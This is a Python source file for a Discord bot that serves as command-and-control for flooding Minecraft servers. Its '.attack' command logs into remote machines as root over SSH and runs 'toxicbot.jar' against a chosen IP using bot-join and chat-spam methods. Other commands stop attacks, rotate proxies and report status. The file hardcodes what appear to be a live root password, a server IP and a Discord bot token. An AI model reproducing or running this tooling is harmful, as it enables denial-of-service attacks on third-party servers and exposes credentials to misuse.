import discord
from discord.ext import commands
import asyncio
import asyncssh

# SSH connection details for each server
SSH_SERVERS = [
    {'host': '206.206.123.170', 'port': 22, 'username': 'root', 'password': '+6P161cE7*7Fc76B8mDJj7'},
    # Add more servers as needed
]

# Discord bot token
DISCORD_TOKEN = 'MTI2OTU2NjUwNzM0ODY1NjIzMg.G52LOS.nKKJ9jsf1Xmik2lxW0pFAQCy-Yy8xjsA4QTsjU'

TARGET_CHANNEL_ID = 1247404532422410282  # Replace with your main target channel ID
TARGET_LOG_CHANNEL_ID = 1283320336196308993  # Log channel ID for attack logs

# Create Discord client
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

current_attack = None
attack_task = None  # To store the attack task

METHODS = ['chatbot', 'botjoiner']  # Available methods
DEFAULT_METHOD = 'chatbot'
DEFAULT_PROTOCOL = 47

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

async def run_command_on_server(server, command, server_index):
    """Run a command on a given SSH server and send output live with correct format."""
    try:
        async with asyncssh.connect(
            server['host'], 
            port=server['port'], 
            username=server['username'], 
            password=server['password'],
            known_hosts=None
        ) as conn:
            async with conn.create_process(command) as process:
                log_channel = bot.get_channel(TARGET_LOG_CHANNEL_ID)
                if log_channel:
                    # Continuously read each line in real-time and send it immediately
                    while not process.stdout.at_eof():
                        line = await process.stdout.readline()
                        if line.strip():
                            # Send the output to the log channel live, in real-time with correct format
                            await log_channel.send(f"Server {server_index} : {line.strip()}")
                await process.wait()
            return True
    except (OSError, asyncssh.Error) as e:
        log_channel = bot.get_channel(TARGET_LOG_CHANNEL_ID)
        if log_channel:
            await log_channel.send(f"Error on Server {server_index} : {str(e)}")
        return False

@bot.command()
async def online(ctx):
    """Check which servers are online and display the count."""
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    command = 'echo "ping"'  # Simple command to check if the server is reachable
    
    async def check_server_status(server, server_index):
        try:
            return await asyncio.wait_for(run_command_on_server(server, command, server_index), timeout=5)  # 5 seconds timeout
        except asyncio.TimeoutError:
            return False  # Consider the server offline if timeout occurs

    tasks = [check_server_status(server, idx + 1) for idx, server in enumerate(SSH_SERVERS)]

    # Execute the tasks in parallel and collect results
    results = await asyncio.gather(*tasks)

    # Count how many servers are online (successful ping)
    online_servers = sum(1 for result in results if result)
    
    await ctx.send(f'Online servers: {online_servers}')

@bot.command()
async def attack(ctx, *args):
    global current_attack, attack_task

    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    if not args:
        await ctx.send('.attack <methods: default: chatbot> <ip> <protocol: default: 47> <seconds>')
        return

    method = DEFAULT_METHOD
    protocol = DEFAULT_PROTOCOL
    ip = None
    seconds = None

    if args[0] in METHODS:
        method = args[0]
        args = args[1:]

    if len(args) == 3:
        ip, protocol, seconds = args
        protocol = int(protocol)
        seconds = int(seconds)
    elif len(args) == 2:
        ip, seconds = args
        seconds = int(seconds)
    elif len(args) == 1:
        ip = args[0]
        await ctx.send('.attack <methods: default: chatbot> <ip> <protocol: default: 47> <seconds>')
        return

    command = f'java -jar toxicbot.jar {ip} {protocol} {method} {seconds} -1'
    current_attack = ip

    await ctx.send(f'Attack on {ip} started for {seconds} seconds using method {method} and protocol {protocol}.')

    log_channel = bot.get_channel(TARGET_LOG_CHANNEL_ID)
    if log_channel:
        await log_channel.send(f'Attack on {ip} started for {seconds} seconds using method {method} and protocol {protocol}.')

    # Run the command on all servers in parallel and send output live
    tasks = [run_command_on_server(server, command, idx + 1) for idx, server in enumerate(SSH_SERVERS)]
    await asyncio.gather(*tasks)

    attack_task = bot.loop.create_task(attack_countdown(ctx, ip, seconds))

async def attack_countdown(ctx, ip, seconds):
    """Track attack duration and handle completion."""
    await asyncio.sleep(seconds)
    global current_attack
    current_attack = None

    log_channel = bot.get_channel(TARGET_LOG_CHANNEL_ID)
    if log_channel:
        await log_channel.send(f'Attack on {ip} has ended.')

@bot.command()
async def stop(ctx):
    """Stop the current attack."""
    global current_attack, attack_task

    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    if current_attack is None:
        await ctx.send('No attack is currently running.')
        return

    command = 'pkill -f toxicbot.jar'
    await ctx.send(f'Stopping attack on {current_attack}...')

    # Log attack stop
    log_channel = bot.get_channel(TARGET_LOG_CHANNEL_ID)
    if log_channel:
        await log_channel.send(f'Stopping attack on {current_attack}...')

    # Run pkill command multiple times on all servers to ensure the process is stopped
    tasks = []
    for idx, server in enumerate(SSH_SERVERS):
        server_name = f"Server {idx + 1}"
        for _ in range(3):  # Run the pkill command 3 times on each server
            tasks.append(run_command_on_server(server, command, server_name))

    await asyncio.gather(*tasks)

    if attack_task:
        attack_task.cancel()

    current_attack = None
    await asyncio.sleep(2)  # Wait for 2 seconds before confirming stop
    await ctx.send('Attack stopped.')

@bot.command()
async def ongoing(ctx):
    """Show if an attack is ongoing."""
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    if current_attack is None:
        await ctx.send('No attack is currently ongoing.')
    else:
        await ctx.send(f'Attack is ongoing on server: {current_attack}')

@bot.command()
async def proxy(ctx):
    """Update the proxy list."""
    command = 'python3 g.py 4'
    await ctx.send('Updating proxy list...')

    tasks = []
    for idx, server in enumerate(SSH_SERVERS):
        server_name = f"Server {idx + 1}"
        tasks.append(run_command_on_server(server, command, server_name))

    await asyncio.gather(*tasks)

    await ctx.send('Proxy update successful.')

@bot.command()
async def methods(ctx):
    """Show available attack methods."""
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return

    await ctx.send(f"Available methods: {', '.join(METHODS)}")

# Remove default help command to avoid conflicts
bot.remove_command('help')

@bot.command(name='help')
async def custom_help(ctx):
    """Custom help command."""
    if ctx.channel.id != TARGET_CHANNEL_ID:
        return
    
    help_message = (
        "Here are the available commands:\n"
        ".attack   - Start an attack on the Minecraft server.\n"
        ".stop     - Stop the ongoing attack.\n"
        ".ongoing  - Show if an attack is ongoing.\n"
        ".proxy    - Update the proxy list.\n"
        ".online   - Check how many servers are online.\n"
        ".methods  - Show available attack methods.\n"
    )
    await ctx.send(help_message)

bot.run(DISCORD_TOKEN)
